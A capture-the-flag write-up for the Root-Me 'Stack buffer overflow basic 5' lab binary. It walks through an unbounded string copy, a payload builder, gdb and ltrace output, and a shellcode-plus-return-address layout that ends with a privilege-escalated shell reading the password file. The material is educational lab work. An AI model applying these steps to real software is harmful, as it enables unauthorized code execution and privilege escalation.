# ELF x86 - Stack buffer overflow basic 5
https://www.root-me.org/en/Challenges/App-System/ELF32-Stack-buffer-overflow-basic-5
```
Environment configuration :
PIE 	Position Independent Executable 	 No 
RelRO 	Read Only relocations 	                 No 
NX 	Non-Executable Stack 	                 No 
ASLR 	Address Space Layout Randomization 	 No 
SF 	Source Fortification 	                 No 
SSP 	Stack-Smashing Protection 	         No 
SRC 	Source code access 	                 Yes 

Challenge connection informations :

Host	        challenge02.root-me.org
Protocol	SSH
Port	        2222
SSH access 	ssh -p 2222 app-systeme-ch10@challenge02.root-me.org   
Username	app-systeme-ch10
Password	app-systeme-ch10
```
According to the source code, the program requires a file's path. The file (which the path to it was given) need to contain "USERNAME=" as the first 9 bytes, and then the program will accept any 503 bytes.<br>
Then it will copy the bytes into a buffer of 128 bytes long.<br>
The vulnerable code in the function is:
```c
void cpstr(char *dst, const char *src)
{
  for(; *src; src++, dst++)
  {
    *dst = *src;
  }
  *dst = 0;
}
[...snip...]
cpstr(init.username, buff+9);
```
As you may see, there is no boundary check. Therefore an attacker can overflow the **init.username** buffer with 503 bytes at most, which will cause 375 bytes after the **init.username** to be overwritten.
Let's take a look at the **Init** struct:
```c
struct Init
{
  char username[128];
  uid_t uid;
  pid_t pid;  
};
```
The layout of the struct is pretty basic. The **Init.username** is 128, the **uid** is 4 bytes and the **pid** is 4 bytes. So in order to overflow the struct, more than 136 bytes are needed.<br>
In addition to the above, before the **Init** struct initialization there is a local **FILE *** variable. It's important to keep it the same, so _fclose_ function at line 64 when throw a signal.<br>
A quick debugging (in gdb) or a quick look at ltrace, one can see that the file pointer is 0x804b008:
```sh
app-systeme-ch10@challenge02:~$ python -c "print 'USERNAME=' + 'A'*136 + '\x08\xb0\x04\x08' + 'DDDD'" > /tmp/badfile
app-systeme-ch10@challenge02:~$ ltrace ./ch10 /tmp/badfile
__libc_start_main(0x80486bc, 2, 0xbffffc34, 0x8048770 <unfinished ...>
fopen("/tmp/badfile", "r")                                                                                                    = 0x804b008
getpid()                                                                                                                      = 27277
getuid()                                                                                                                      = 1110
fgets("USERNAME=AAAAAAAAAAAAAAAAAAAAAAA"..., 512, 0x804b008)                                                                  = 0xbffff793
fgets(nil, 512, 0x804b008)    <============================== right here                                                                                          
fclose(0x804b008)                                                                                                             = 0
printf("[+] Runing the program with user"..., "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 1094795585, 1094795585[+] Runing the program with username AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp�������, uid 1094795585 and pid 1094795585.
)                  = 222
```
As one may see, it's not enough. Let's take a quick look at the _Init_ function's epilogue:
```asm
   0x080486b5 <+268>:	pop    ebx
   0x080486b6 <+269>:	pop    esi
   0x080486b7 <+270>:	pop    edi
   0x080486b8 <+271>:	pop    ebp
   0x080486b9 <+272>:	ret    0x4
```
The function doesn't just return. It returns and "deletes" the value after the return address. So, the _Init_ return value is at **ebp+8**.<br>
According to the source code, the return value is the **Init** struct. So, let's try not to mess it up.<br>
Basically, the exploit layout should look like the following:
```
    +-----------+-----------------------+-------------------+--------------------+------------------+---------------------+------------------+
    | USERNAME= | 28 bytes of SHELLCODE | 108 bytes of JUNK | FILE *file address | 28 bytes of JUNK | SHELLCODE's address | Address of EBP+8 |
    +-----------+-----------------------+-------------------+--------------------+------------------+---------------------+------------------+
```
Let's find the addresses using gdb:
```gdb
app-systeme-ch10@challenge02:~$ bash /tmp/r.sh gdb
(gdb) file ./ch10
Reading symbols from ./ch10...done.
(gdb) break *0x08048663
Breakpoint 1 at 0x8048663: file binary10.c, line 61.
(gdb) run /tmp/badfile
Starting program: /challenge/app-systeme/ch10/ch10 /tmp/badfile

Breakpoint 1, 0x08048663 in Init (filename=0xbffffe38 "/tmp/badfile") at binary10.c:61
61	binary10.c: No such file or directory.
(gdb) p &buff
$1 = (char (*)[513]) 0xbffff873
(gdb) x $ebp+8
0xbffffb20:	0xbffffb30
```
So adding those addresses to the exploit will result in the following output:
```sh
$ id
uid=1110(app-systeme-ch10) gid=1110(app-systeme-ch10) euid=1210(app-systeme-ch10-cracked) groups=1210(app-systeme-ch10-cracked),100(users),1110(app-systeme-ch10)
$ cat .passwd
<censored>
```
